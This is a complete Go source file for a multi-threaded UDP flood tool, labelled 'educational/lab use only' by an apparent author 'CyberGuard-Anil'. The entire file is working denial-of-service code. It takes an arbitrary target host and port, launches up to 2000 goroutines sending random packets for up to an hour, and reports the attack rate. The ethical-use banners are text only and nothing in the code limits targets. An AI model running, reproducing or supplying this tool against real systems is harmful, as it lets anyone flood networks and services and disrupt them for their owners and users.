// udp_flood.go
//
// UDP Flood Simulation Tool for Educational/Lab Use ONLY
// Author: CyberGuard-Anil
//
// ETHICAL USE ONLY!
// Use strictly on authorized labs, environments, or with written permission.
// Misuse of this code is illegal and strictly prohibited!

package main

import (
    "errors"
    "flag"
    "fmt"
    "log"
    "math/rand"
    "net"
    "os"
    "regexp"
    "sync"
    "time"
)

const (
    logFile     = "../results/attack_errors.log"
    maxLogSize  = 1 * 1024 * 1024 // 1MB
)

func rotateLogIfNeeded() {
    fi, err := os.Stat(logFile)
    if err == nil && fi.Size() > maxLogSize {
        timestamp := time.Now().Format("20060102_150405")
        os.Rename(logFile, fmt.Sprintf("%s.%s", logFile, timestamp))
    }
}

func setupLogging() {
    rotateLogIfNeeded()
    f, err := os.OpenFile(logFile, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0666)
    if err != nil {
        fmt.Fprintln(os.Stderr, "[!] Logging disabled: cannot open log file.")
        return
    }
    log.SetOutput(f)
    log.SetFlags(log.LstdFlags | log.Lshortfile)
}

func printBanner() {
    fmt.Println(`
╔════════════════════════════════════════════════════╗
║            UDP Flood Educational Tool                                  ║
║   Use ONLY with written authorization or in labs                ║
╚════════════════════════════════════════════════════╝
`)
}

// UDPFlooder encapsulates a multi-threaded UDP flood attack
type UDPFlooder struct {
    Target      string
    Port        int
    Duration    int
    Threads     int
    PacketSize  int
    stopChan    chan struct{}
    wg          sync.WaitGroup
    packetsSent int64
    mutex       sync.Mutex
}

// NewUDPFlooder returns a UDPFlooder instance
func NewUDPFlooder(target string, port, duration, threads, packetSize int) *UDPFlooder {
    return &UDPFlooder{
        Target:     target,
        Port:       port,
        Duration:   duration,
        Threads:    threads,
        PacketSize: packetSize,
        stopChan:   make(chan struct{}),
    }
}

// generatePayload builds random UDP packet data
func (u *UDPFlooder) generatePayload() []byte {
    payload := make([]byte, u.PacketSize)
    for i := range payload {
        payload[i] = byte(rand.Intn(256))
    }
    return payload
}

// floodWorker sends UDP packets as fast as possible, until stopped
func (u *UDPFlooder) floodWorker(workerID int) {
    defer u.wg.Done()
    conn, err := net.Dial("udp", fmt.Sprintf("%s:%d", u.Target, u.Port))
    if err != nil {
        log.Printf("[Worker %d] Failed to connect: %v", workerID, err)
        fmt.Printf("[Worker %d] Failed to connect: %v\n", workerID, err)
        return
    }
    defer conn.Close()
    fmt.Printf("[Worker %d] Started UDP flooding\n", workerID)
    for {
        select {
        case <-u.stopChan:
            fmt.Printf("[Worker %d] Stopping...\n", workerID)
            return
        default:
            payload := u.generatePayload()
            _, err := conn.Write(payload)
            if err != nil {
                log.Printf("[Worker %d] Write error: %v", workerID, err)
                continue
            }
            u.mutex.Lock()
            u.packetsSent++
            u.mutex.Unlock()
            // Brief delay to avoid network/view overwhelming
            time.Sleep(time.Microsecond * 100)
        }
    }
}

// monitor reports attack rate/progress
func (u *UDPFlooder) monitor() {
    start := time.Now()
    ticker := time.NewTicker(time.Second)
    defer ticker.Stop()
    for {
        select {
        case <-u.stopChan:
            return
        case <-ticker.C:
            elapsed := time.Since(start).Seconds()
            remaining := float64(u.Duration) - elapsed
            u.mutex.Lock()
            packets := u.packetsSent
            u.mutex.Unlock()
            rate := float64(packets) / (elapsed + 1e-6)
            fmt.Printf("\r[UDP FLOOD] Packets: %d | Rate: %.1f/s | Remaining: %.1fs", 
                packets, rate, remaining)
        }
    }
}

// Start launches the UDP flood for the given duration
func (u *UDPFlooder) Start() {
    fmt.Printf("\n[GO UDP FLOOD] Starting attack...\n")
    fmt.Printf("Target: %s:%d\n", u.Target, u.Port)
    fmt.Printf("Duration: %d seconds\n", u.Duration)
    fmt.Printf("Threads: %d\n", u.Threads)
    fmt.Printf("Packet Size: %d bytes\n\n", u.PacketSize)
    go u.monitor()
    for i := 0; i < u.Threads; i++ {
        u.wg.Add(1)
        go u.floodWorker(i)
    }
    time.Sleep(time.Duration(u.Duration) * time.Second)
    close(u.stopChan)
    u.wg.Wait()
    u.mutex.Lock()
    totalPackets := u.packetsSent
    u.mutex.Unlock()
    fmt.Printf("\n\n[ATTACK COMPLETED] Total packets sent: %d\n", totalPackets)
}

// validateInputs checks for proper/secure configuration
func validateInputs(target string, port, duration, threads, packetSize int) error {
    if target == "" {
        return errors.New("target IP/hostname required")
    }
    isIP := regexp.MustCompile(`^(\d{1,3}\.){3}\d{1,3}$`).MatchString(target)
    if !isIP {
        addrs, err := net.LookupHost(target)
        if err != nil || len(addrs) == 0 {
            return fmt.Errorf("cannot resolve target %s", target)
        }
    }
    if port <= 0 || port > 65535 {
        return errors.New("invalid port: must be 1-65535")
    }
    if duration < 1 || duration > 3600 {
        return errors.New("duration must be in [1,3600] seconds")
    }
    if threads < 1 || threads > 2000 {
        return errors.New("threads: min 1, max 2000")
    }
    if packetSize < 8 || packetSize > 65507 {
        return errors.New("packet size: min 8, max 65507")
    }
    return nil
}

func main() {
    setupLogging()
    printBanner()

    target := flag.String("t", "", "Target IP address or hostname (required)")
    port := flag.Int("p", 80, "Target port (1-65535)")
    duration := flag.Int("d", 60, "Attack duration in seconds (1-3600)")
    threads := flag.Int("r", 100, "Number of goroutines/threads (1-2000)")
    packetSize := flag.Int("s", 1024, "UDP packet size in bytes (8-65507)")

    flag.Usage = func() {
        fmt.Fprintf(flag.CommandLine.Output(), `
    Usage: %s -t <target> -p <port> -d <seconds> -r <threads> -s <size>
    Example: %s -t 192.168.1.10 -p 53 -d 60 -r 200 -s 1400
    `, os.Args[0], os.Args[0])
        flag.PrintDefaults()
    }

    flag.Parse()

    // Strict input validation
    if err := validateInputs(*target, *port, *duration, *threads, *packetSize); err != nil {
        log.Printf("[Input Error] %v", err)
        fmt.Fprintf(os.Stderr, "[!] Input error: %v\n", err)
        flag.Usage()
        os.Exit(1)
    }

    // Ethical warning
    fmt.Println("[!] For authorized/educational/lab environments ONLY.\n" +
        "[!] Unauthorized network attacks are illegal!")

    rand.Seed(time.Now().UnixNano())

    flooder := NewUDPFlooder(*target, *port, *duration, *threads, *packetSize)
    flooder.Start()
}

